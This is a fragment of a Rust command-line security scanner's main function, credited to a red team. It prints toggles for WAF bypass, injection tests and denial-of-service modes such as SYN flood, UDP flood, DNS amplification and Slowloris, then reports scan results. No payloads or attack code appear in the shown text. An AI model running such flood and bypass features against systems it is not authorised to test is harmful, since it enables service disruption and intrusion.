    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();
    
    // Check if interactive mode (no target provided)
    if args.target.is_none() {
        return interactive_mode(args).await;
    }
    
    // Direct scan mode with banner
    display_firewall_banner().await;
    
    let target = args.target.clone().unwrap();
    
    println!("Detection Configuration:");
    println!("  Target URL: {}", target);
    println!("  Target Path: {}", args.path);
    println!("  Timeout: {} seconds", args.timeout);
    println!("  SQL Injection: {}", if args.test_sql { "ENABLED" } else { "DISABLED" });
    println!("  XSS Detection: {}", if args.test_xss { "ENABLED" } else { "DISABLED" });
    println!("  Path Traversal: {}", if args.test_path_traversal { "ENABLED" } else { "DISABLED" });
    println!("  Command Injection: {}", if args.test_command_injection { "ENABLED" } else { "DISABLED" });
    println!("  Common WAF Tests: {}", if args.test_common { "ENABLED" } else { "DISABLED" });
    println!("  Stealth Detection: {}", if args.detect_stealth { "ENABLED" } else { "DISABLED" });
    println!("  Cache Poisoning: {}", if args.cache_poison { "ENABLED" } else { "DISABLED" });
    println!("  Aggressive Mode: {}", if args.aggressive { "ENABLED" } else { "DISABLED" });
    println!("  Advanced Payloads: {}", args.advanced_payloads);
    println!("  Generate Bypass: {}", if args.generate_bypass { "ENABLED" } else { "DISABLED" });
    println!("  HTTP/2 Attacks: {}", if args.test_http2 { "ENABLED" } else { "DISABLED" });
    println!("  DNS Amplification: {}", if args.test_dns_amplification { "ENABLED" } else { "DISABLED" });
    println!("  TCP SYN Flood: {}", if args.test_tcp_syn_flood { "ENABLED" } else { "DISABLED" });
    println!("  UDP Flood: {}", if args.test_udp_flood { "ENABLED" } else { "DISABLED" });
    println!("  HTTP Slowloris: {}", if args.test_slowloris { "ENABLED" } else { "DISABLED" });
    println!("  SSL/TLS Attacks: {}", if args.test_ssl_attacks { "ENABLED" } else { "DISABLED" });
    println!("  IP Simulation: {}", if args.simulate_ips { "ENABLED" } else { "DISABLED" });
    println!("  Advanced Red Team: {}", if args.advanced_red_team { "ENABLED" } else { "DISABLED" });
    println!();
    
    info!("Starting WAF detection...");
    
    let result = run_waf_detection(args.clone()).await?;
    
    display_scan_results(&result);
    
    if !result.signatures_matched.is_empty() {
        println!("{}:", "Signatures Matched".bright_cyan().bold());
        for signature in &result.signatures_matched {
            println!("  - {}", signature.white());
        }
        println!();
    }
    
    if !result.blocked_payloads.is_empty() && args.verbose {
        println!("{}:", "Blocked Payloads".bright_red().bold());
        for (i, payload) in result.blocked_payloads.iter().take(10).enumerate() {
            println!("  {}. {}", i + 1, payload.white());
        }
        if result.blocked_payloads.len() > 10 {
            println!("  ... and {} more", (result.blocked_payloads.len() - 10).to_string().bright_yellow());
        }
        println!();
    }
    
    // Status code distribution
    if !result.response_analysis.status_code_distribution.is_empty() {
        println!("{}:", "Status Code Distribution".bright_cyan().bold());
        for (code, count) in &result.response_analysis.status_code_distribution {
            println!("  {} : {} requests", code.to_string().bright_yellow(), count);
        }
        println!();
    }
    
    // Write output if requested
    if let Some(output_file) = &args.output {
        let json_output = serde_json::to_string_pretty(&result)?;
        std::fs::write(output_file, json_output)?;
        println!("{} Results saved to: {}", "[OK]".green().bold(), output_file.bright_cyan());
    }
    
    println!();
    println!("{}", "[COMPLETE] WAF Detection scan finished".green().bold());
    println!("{}", "Author: khaninkali | HyperSecurity Red Team".dimmed());
    println!();
    
    Ok(())
}
